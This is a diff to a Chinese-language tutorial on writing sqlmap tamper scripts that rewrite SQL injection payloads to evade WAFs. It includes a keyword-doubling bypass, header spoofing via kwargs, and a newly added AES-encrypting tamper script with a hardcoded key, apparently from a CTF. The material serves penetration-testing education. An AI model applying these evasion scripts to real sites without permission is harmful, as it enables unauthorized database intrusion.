@@ -2,8 +2,6 @@
 
 sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。
 
-
-
 ## 0x01 一个最小的例子
 
 为了说明tamper的结构，让我们从一个最简单的例子开始
@@ -20,7 +18,6 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     return payload.replace("'", "\\'").replace('"', '\\"')
-
 ```
 
 不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。
@@ -30,7 +27,7 @@ priority定义脚本的优先级，用于有多个tamper脚本的情况。
 dependencies函数声明该脚本适用/不适用的范围，可以为空。
 
 tamper是主要的函数，接受的参数为payload和\*\*kwargs  
- 返回值为替换后的payload。比如这个例子中就把引号替换为了\\'。
+ 返回值为替换后的payload。比如这个例子中就把引号替换为了\'。
 
 ## 0x02 详细介绍
 
@@ -56,12 +53,9 @@ $sql="SELECT * FROM users WHERE id='$id'";
 ```py
 def tamper(payload, **kwargs):
     return payload.replace('union','uniounionn')
-
 ```
 
 **保存为replaceunion.py，存到sqlmap/tamper/下，执行的时候带上--tamper=replaceunion的参数，就可以绕过该过滤规则**
-
-
 
 #### dependencies函数
 
@@ -76,7 +70,6 @@ def dependencies():
     singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])
 
 # singleTimeWarnMessage() 用于在控制台中打印出警告信息
-
 ```
 
 #### kwargs
@@ -90,7 +83,6 @@ def tamper(payload, **kwargs):
     headers = kwargs.get("headers", {})
     headers["X-originating-IP"] = "127.0.0.1"
     return payload
-
 ```
 
 这个脚本是为了更改X-originating-IP，以绕过WAF，另一个kwargs的使用出现于xforwardedfor.py，也是为了改header以绕过waf
@@ -126,6 +118,30 @@ class DBMS:
     SQLITE = "SQLite"
     SYBASE = "Sybase"
     HSQLDB = "HSQLDB"
+```
+
+示例：aes加密
+
+```py
+from Crypto.Cipher import AES
+from base64 import b64encode
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+def dependencies():
+    pass
+def tamper(payload,**kwargs):
+    return encrypt(payload)
+def encrypt(text):
+    text = text+'hxb2018'
+    key = 'ydhaqPQnexoaDuW3'
+    iv = '2018201920202021'
+    cryptor = AES.new(key,AES.MODE_CBC,iv)
+    padding = lambda x: x + (16-(len(x)%16 or 16))*'\0'
+    plain = padding(text)
+    cipher = cryptor.encrypt(plain)
+    result = b64encode(b64encode(cipher))
+    return result
 ```
 
 
